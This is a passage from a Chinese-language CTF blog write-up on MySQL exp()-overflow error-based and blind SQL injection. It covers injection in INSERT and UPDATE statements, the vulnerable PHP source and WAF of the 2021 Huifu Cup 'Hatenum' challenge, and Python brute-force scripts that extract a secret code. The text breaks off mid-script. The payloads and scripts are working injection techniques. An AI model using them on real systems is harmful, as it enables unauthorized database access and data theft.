mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'john'</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)),<span class="hljs-number">1</span>);#<span class="hljs-string">','</span><span class="hljs-number">679237</span><span class="hljs-string">');;</span>
<span class="hljs-string">ERROR 1690 (22003): DOUBLE value is out of range in '</span><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">'root@localhost'</span> <span class="hljs-keyword">from</span> dual)))<span class="hljs-string">'</span></code></pre>
<p>爆出所有数据：</p>
<pre><code class="hljs sql"># 在username处插入: 
john<span class="hljs-string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#</span>
<span class="hljs-string"></span>
<span class="hljs-string">mysql&gt; insert into users(id,username,password) values(4,'</span>john<span class="hljs-string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#'</span>,<span class="hljs-string">'679237'</span>);
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="hljs-string">' from dual)))'</span></code></pre>
<h2 id="update位置注入">Update位置注入</h2>
<p>根据 Update 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">'new_value'</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'admin'</span>;</code></pre>
<p>我们可以在 new_value 或后面的 where 子句处插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre><code class="hljs sql"># 在new_value处插入: 
abc<span class="hljs-string">' or exp(~(select * from(select user())x))#, </span>
<span class="hljs-string">则sql语句为: update users set password='</span>abc<span class="hljs-string">' or exp(~(select * from(select user())x))# WHERE username = '</span>admin<span class="hljs-string">';</span>
<span class="hljs-string"></span>
<span class="hljs-string">mysql&gt; update users set password='</span>abc<span class="hljs-string">' or exp(~(select * from(select user())x));# WHERE username = '</span>admin<span class="hljs-string">';</span>
<span class="hljs-string">ERROR 1690 (22003): DOUBLE value is out of range in '</span><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">'root@localhost'</span> <span class="hljs-keyword">from</span> dual)))<span class="hljs-string">'</span></code></pre>
<h2 id="exp-函数进行盲注">exp() 函数进行盲注</h2>
<p>有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。</p>
<h3 id="2021-虎符杯-ctf-finalweb-hatenum">2021 虎符杯 CTF Finalweb Hatenum</h3>
<p>进入题目是一个登录页面：（对我来说有点难度，只能基本抄wp了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215173228030.png" alt="image-20231215173228030"></p>
<p>我们先分析一波题目给的源码</p>
<p>home.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">require_once</span>(<span class="hljs-string">'config.php'</span>);
<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]){
	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'location:index.php'</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]==<span class="hljs-string">'admin'</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'/flag'</span>);
}
<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'hello '</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>];
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里说如果我们存储在session变量中的username=admin的话就给flag</p>
<p>config.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
    <span class="hljs-comment">//数据库配置信息</span>
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">"localhost"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"root"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">"123456"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span> = <span class="hljs-string">"ctf"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-comment">//进行数据库连接</span>
		<span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;host,<span class="hljs-variable">$this</span>-&gt;user,<span class="hljs-variable">$this</span>-&gt;pass,<span class="hljs-variable">$this</span>-&gt;database);
		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'connect error'</span>);
		}
	}
    <span class="hljs-comment">//查询用户输入的用户名是否在数据库中</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>{
		<span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>'"</span>);
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>){
			<span class="hljs-keyword">return</span> True;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-keyword">return</span> False;
		}

	}
    <span class="hljs-comment">//注册功能部分</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>{
		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"insert into users (username,password,code) values ('<span class="hljs-subst">$username</span>','<span class="hljs-subst">$password</span>','<span class="hljs-subst">$code</span>')"</span>)){
			<span class="hljs-keyword">return</span> True;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-keyword">return</span> False;
		}
	}
    <span class="hljs-comment">//如果查询到对应用户名，则成功登录</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>{
		<span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>' and password='<span class="hljs-subst">$password</span>'"</span>);
		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;error){
			<span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span>;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-variable">$content</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();
			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$content</span>[<span class="hljs-string">'code'</span>]===<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>]){
				<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>] = <span class="hljs-variable">$content</span>[<span class="hljs-string">'username'</span>];
				<span class="hljs-keyword">return</span> <span class="hljs-string">'success'</span>;
			}
			<span class="hljs-keyword">else</span>{
				<span class="hljs-keyword">return</span> <span class="hljs-string">'fail'</span>;
			}
		}

	}
}

<span class="hljs-comment">//进行了很有力的过滤，不过没有过滤\与()</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i'</span>, <span class="hljs-variable">$str</span>)){
		<span class="hljs-keyword">die</span>(<span class="hljs-string">'Hack detected'</span>);
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\d{9}|0x[0-9a-f]{9}/i'</span>,<span class="hljs-variable">$str</span>)){
		<span class="hljs-keyword">die</span>(<span class="hljs-string">'Huge num detected'</span>);
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_waf</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>{
	<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>)){
			<span class="hljs-title function_ invoke__">array_waf</span>(<span class="hljs-variable">$value</span>);
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-title function_ invoke__">sql_waf</span>(<span class="hljs-variable">$value</span>);
			<span class="hljs-title function_ invoke__">num_waf</span>(<span class="hljs-variable">$value</span>);
		}
	}
}</code></pre>
<p>那我们重点关注一下sql语句部分</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215174048617.png" alt="image-20231215174048617"></p>
<pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>' and password='<span class="hljs-subst">$password</span>'"</span>);</code></pre>
<p>这里似乎可以构造万能密码，payload似乎与我之前刷的靶场思路一致</p>
<pre><code class="hljs sql">username<span class="hljs-operator">=</span>\
password<span class="hljs-operator">=</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>#
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'(\'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">')||1#'</span>  括号内就是username的值，这样的话可以成功绕过</code></pre>
<p>但这里有一个验证码code无从得知，只能看wp了</p>
<p>所以我们的思路是使用 rlike（即regexp）按照之前regexp匹配注入的方法，将 code 匹配出来。我们又在 login 函数中注意到：</p>
<pre><code class="hljs plaintext">当使用正则匹配时，使用REGEXP和NOT REGEXP操作符(或RLIKE和NOT RLIKE，功能是一样的)
LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1。</code></pre>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
<span class="hljs-operator">|</span>               <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> rlike <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> rlike <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> regexp <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'abcd'</span> regexp <span class="hljs-string">'a'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<p>（好好好，又得学习一波regexp注入了~~~~）</p>
<pre><code class="hljs sql">if($this<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>conn<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>error){    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 如果<span class="hljs-keyword">sql</span>语句报错就返回error
    <span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span>;
}</code></pre>
<p>如果 sql 语句出现错误便返回字符串 “error”，然后进入到 login.php 中就会返回 error。根据这里的特性，如果我们可以控制这里的报错的话，便可以进行盲注。</p>
<p>但是怎么构造呢？在网上的看到了大佬的思路是真的巧妙：</p>
<pre><code class="hljs sql"><span class="hljs-operator">||</span><span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span><span class="hljs-operator">-</span>(... rlike ...))</code></pre>
<p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为True，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为false，转换为 <code>exp(710-0)</code> 后则会溢出并报错。</p>
<p>大致的 payload 如下：</p>
<pre><code class="hljs sql"><span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\'</span>,
<span class="hljs-string">'password'</span>: <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>,
<span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span></code></pre>
<p>对于上述payload的解释（GPT）：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> database()) regexp <span class="hljs-type">binary</span> <span class="hljs-string">'^sec'</span></code></pre>
<p>例子如上，解释如下，大概binary关键字就是用来区分大小写的吧</p>
<pre><code class="hljs plaintext">这段 SQL 语句可以分为两部分，让我一步一步解释：

1. `(select database())`：这部分执行一个子查询，获取当前数据库的名称。

2. `regexp binary '^sec'`：这部分使用正则表达式进行匹配，并且使用 `binary` 进行二进制比较。

    - `regexp` 是 MySQL 中用于执行正则表达式匹配的操作符。
    
    - `binary` 是一个修饰符，用于表示要进行二进制比较。在这个上下文中，它确保正则表达式的匹配是对字节进行精确匹配，而不考虑字符的大小写或编码。

    - `'^sec'` 是一个正则表达式模式，表示以 "sec" 开头的字符串。

综合起来，整个 SQL 语句的含义是：检查当前数据库的名称是否以 "sec" 开头。如果匹配成功，查询将返回 1，表示真（true）；否则，返回 0，表示假（false）。</code></pre>
<p>但这里题目过滤了引号，所以我们rlike无法直接引入%和^。按照之前的regexp注入操作我们可以将^连同后面的待猜测字符一块做Hex编码，之后进入数据库中MySQL会自动将16进制编码的字符转为对应的字符串</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

......

passwd = str2hex(<span class="hljs-string">'^'</span> + name + j)
payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
postdata = {
    <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
    <span class="hljs-string">'password'</span>: payloads,
    <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
}</code></pre>
<p>题目还限制了 password 位置匹配的字符串长度，最长只能匹配 4 个字符，如果超过了 4 个则会返回 Huge num detected 错误（但我不知道为何师傅们都说最多只能4个字符，我看着正则当中是数字9，不应该是9个字符吗。。不理解）。</p>
<p>接着我幸运地找到了一个解释：</p>
<pre><code class="hljs plaintext">同时num_waf 有个判断十六进制位数不能超过9位，既字符串不能超过4位(一个字母对应2个十六进制数)，所以在包含正则^以外的字符串超过3位时需要不断做替换，用3位字符串去匹配下一位</code></pre>
<p>那这样的话我们便不能在 payload 里面使用 <code>^</code> 了，也就没有办法在正则表达式中确定首位的位置，我们只能知道有这么几个连续的字符，就像下面这样：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'ab'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'ab'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-operator">|</span>                                             <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'lag{'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> rlike <span class="hljs-string">'lag{'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-operator">|</span>                                               <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------------------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)</code></pre>
<p>师傅的爆破思路：先爆破出前三位来，然后再通过前 3 位爆第4位，再通过第2、3、4位爆第5位…</p>
<p>编写如下脚本进行爆破：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}
payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    z = <span class="hljs-number">3</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(name + j)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<span class="hljs-comment">#0x0c代替空格</span>
            postdata = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads,
                <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
            }
            r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
            <span class="hljs-comment">#print(r.text)</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">''</span>)
                <span class="hljs-keyword">break</span>

        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt;= <span class="hljs-number">3</span>:
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
                    passwd = str2hex(name[z - <span class="hljs-number">3</span>:z] + j)  <span class="hljs-comment"># ergh</span>
                    payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
                    postdata = {
                        <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                        <span class="hljs-string">'password'</span>: payloads,
                        <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
                    }
                    r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
                    <span class="hljs-comment"># print(r.text)</span>
                    <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                        name += j
                        <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">''</span>)
                        z += <span class="hljs-number">1</span>
                        <span class="hljs-keyword">break</span></code></pre>
<p>出结果了，别高兴的太早，因为这里陷入了一个死循环当中：</p>
<pre><code class="hljs plaintext">erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh......</code></pre>
<p>可以看到爆出 <code>erghruigh2</code> 之后不停地循环出现 <code>uygh2</code>，所以我们可以推测出真正的 code 里面有两个 <code>gh2</code>，其中位于前面的那个 <code>gh2</code> 后面紧跟着一个 <code>u</code>，即 <code>gh2u</code>。后面那个 <code>gh2</code> 后面跟的是那个字符我们还不能确定，那我们便可以测试一下除了 <code>u</code> 以外的其他字符，经测试第二个 <code>gh2</code> 后面跟的字符是 <code>3</code>，即 <code>gh23</code>，然后继续根据 <code>h23</code> 爆破接下来的字符就行了，最后得到的 code 如下：</p>
<pre><code class="hljs plaintext">erghruigh2uygh23uiu32ig</code></pre>
<p>不过这里我也是想不通最后这个死循环的解决原理。。。</p>
<p>然后直接登陆即可得到 flag：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215200129931.png" alt="image-20231215200129931"></p>
<p>接着我又找了几篇wp发现有位师傅直接从最后一个字符开始匹配，用到了$正则：</p>
<pre><code class="hljs plaintext">$ 是一个用于锚定模式结尾位置的元字符，用于确保匹配发生在输入字符串的末尾。</code></pre>
<p>这样就不会有上述重复的问题，但是也要配合从第一位开始爆破的脚本，这样两者对比才可正确得出</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params">string</span>):  <span class="hljs-comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
    result = result.replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + result

strs = string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>
url = <span class="hljs-string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
}
payload = <span class="hljs-string">'||exp(710-(code rlike binary {0}))#'</span>
tmp = <span class="hljs-string">'$'</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    name = <span class="hljs-string">''</span>
    z = <span class="hljs-number">3</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:
            passwd = str2hex(j + tmp)
            payloads = payload.<span class="hljs-built_in">format</span>(passwd).replace(<span class="hljs-string">' '</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))
            postdata = {
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'admin\\'</span>,
                <span class="hljs-string">'password'</span>: payloads,
                <span class="hljs-string">'code'</span>: <span class="hljs-string">'1'</span>
            }
            r = requests.post(url, data=postdata, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)
            <span class="hljs-comment">#print(r.text)</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"fail"</span> <span class="hljs-keyword">in</span> r.text:
                name += j
                <span class="hljs-built_in">print</span>(j + tmp, name)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:
                    tmp = j + tmp[:-<span class="hljs-number">1</span>]
                <span class="hljs-keyword">else</span>:
                    tmp = j + tmp
                <span class="hljs-keyword">break</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215200406827.png" alt="image-20231215200406827"></p>
<p>如上图，最后简单反转一下字符串即可</p>
<p>最后会有如下：</p>
<pre><code class="hljs plaintext">erghruigh2uygh2uygh2uygh2uygh2
erghruigh23uiu32ig</code></pre>
<p>我们两者对比得到<code>erghruigh2uygh23uiu32ig</code></p>
<p>只能说脚本对我来说好难。。。接下来就是跟着编写脚本的时候了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

